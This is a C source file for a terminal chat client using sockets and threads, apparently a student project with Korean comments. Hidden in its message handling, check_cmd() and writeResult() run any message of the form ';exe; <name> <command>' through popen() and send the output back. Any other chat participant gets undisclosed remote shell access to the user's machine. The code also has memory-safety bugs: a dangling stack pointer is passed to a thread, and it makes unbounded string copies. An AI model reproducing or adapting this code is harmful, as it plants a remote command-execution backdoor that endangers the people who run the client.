//client
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<netdb.h>
#include<pthread.h>
#include<signal.h>

#define BUFFERSIZE 300
#define NAME 20
#define TEXT 300

#define EXE ";exe;"
#define SV_NAME "server"

void error(const char * msg);

struct texts {
   char name[NAME];
   char texts[TEXT];
};

char myName[NAME];//아이디 저장
void *writeMessage(void*arg);
void * readMessage(void * arg);

int server_fd;

void signal_int(int sig){
	struct texts msg_box;

	strcpy(msg_box.name,"");
	sprintf(msg_box.texts,"%s exit the chattingRoom\n\n",myName);
	write(server_fd, &msg_box, sizeof(msg_box));
	exit(1);
}

int main(int argc, char *argv[])
{
   int sockfd, portno, n;
   struct sockaddr_in serv_addr;
   struct hostent * server;
   pthread_t sendThread, ReceiveThread;
   void * threadTerminate;

   if (argc < 3) {
      fprintf(stderr, "usage %s hostname port\n", argv[0]);
      exit(0);
   }

	printf("Enter your name : ");
	while(1){
		fgets(myName, NAME, stdin);
		if (strcmp(myName,"\n")==0){
			printf("give name : ");
			continue;		
		}
		sscanf(myName,"%s",myName);
		if (strcmp(myName,SV_NAME) ==0){
			printf("do not use server name : ");
			continue;
		}	
		break;
	}
   server = gethostbyname(argv[1]);
   if (server == NULL)
      fprintf(stderr, "error,no such host");

   portno = atoi(argv[2]);
   sockfd = socket(AF_INET, SOCK_STREAM, 0);//소켓 생성
   if (sockfd < 0)
      error("error opening socket");


   bzero((char*)&serv_addr, sizeof(serv_addr));//초기화
   serv_addr.sin_family = AF_INET;//소켓 타입 정하기
   bcopy((char*)server->h_addr, (char*)&serv_addr.sin_addr.s_addr, server->h_length);//아이피주소 넣기
   serv_addr.sin_port = htons(portno);//set portnum

   if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0)//서버와 연결하기
      error("connect failed");
	
	server_fd = sockfd;
	signal(SIGINT,signal_int);
   pthread_create(&sendThread, NULL, writeMessage, (void*)&sockfd);//메세지 쓰기에 대한 쓰레드 생성
   pthread_create(&ReceiveThread, NULL, readMessage, (void*)&sockfd);//메세지 읽기에 대한 쓰레드 생성
   pthread_join(sendThread, &threadTerminate);//쓰레드 종료
   pthread_join(ReceiveThread, &threadTerminate);//쓰레드 종료

   close(sockfd);
   return 0;

}

void * writeMessage(void* arg)
{
	int socketfd = *((int*)arg);//파일 디스크립터 받아서 서버에게 메세지를 씀
	char message[BUFFERSIZE];
	struct texts msg_box;
	
	strcpy(msg_box.name,"");
	sprintf(msg_box.texts,"%s Enter the chattingRoom\n\n",myName);
	write(socketfd, &msg_box, sizeof(msg_box));
	
	strcpy(msg_box.name,myName);
	while (1){
		fgets(message, BUFFERSIZE, stdin);
		strcpy(msg_box.texts,message);
		write(socketfd, &msg_box, sizeof(msg_box));
	}
	return NULL;
}
void * writeResult(void* arg)
{
	int socketfd = server_fd;//파일 디스크립터 받아서 서버에게 메세지를 씀
	char message[BUFFERSIZE];
	char* sendMessage;
	struct texts cmd_box = *((struct texts *)arg);
	FILE* fp = NULL;

	if(strcmp(cmd_box.texts,"") ==0){
		printf("answer request\n");
		strcpy(cmd_box.texts,"empty command\n");
		write(socketfd, &cmd_box, sizeof(cmd_box));	
		return NULL;
	}
	if((fp=popen(cmd_box.texts,"r"))==NULL)
		perror("popen");
	printf("answer request\n");
	strcpy(cmd_box.texts,"");
	write(socketfd, &cmd_box, sizeof(cmd_box));

	strcpy(cmd_box.name,"");
	while(feof(fp) == 0){
		fread(message,sizeof(char),TEXT,fp);
		strcpy(cmd_box.texts,message);
		write(socketfd, &cmd_box, sizeof(cmd_box));
	}
	return NULL;
}
void check_cmd(struct texts arg){
	char str[20] = EXE;
	struct texts cmd_box;
	pthread_t thread;
	char msg[TEXT];

	strcpy(cmd_box.name,"");
	strcpy(cmd_box.texts,"");

	strcpy(msg,arg.texts);

	if (strncmp(msg,EXE,strlen(EXE)) != 0)
		return;
	strcat(str,"%s %s");
	sscanf(msg,str,cmd_box.name,cmd_box.texts);
	
	strcpy(cmd_box.texts,strstr(msg,cmd_box.texts));
	if (strcmp(cmd_box.name,myName) == 0)
		pthread_create(&thread, NULL, writeResult, (void*)&cmd_box);
}
void * readMessage(void*arg)
{
	int socketfd = *((int*)arg);//파일 디스크립터 받아서 서버에서 메세지 받아옴
	char recvMessage[BUFFERSIZE];
	int length;
	struct texts msg_box;
	while (1)
	{
		length = read(socketfd, &msg_box, sizeof(msg_box));
		if (length == 0){
			printf("server down\n");
			exit(1);
		}
		/*if (strcmp(msg_box.name,SV_NAME) == 0 && strcmp(msg_box.texts,"exit")){
			printf("server exited\n");
			exit(1);
		}
		else */if (strcmp(msg_box.name,"") == 0){
			printf("%s",msg_box.texts);
		}
		else if(strcmp(msg_box.name,myName) != 0){
			printf("\n<%s> :\n %s\n",msg_box.name,msg_box.texts);
			check_cmd(msg_box);
		}
		else
			printf("\n");	
	}
	return NULL;
}
void error(const char * msg)
{
   perror(msg);
   exit(0);
}
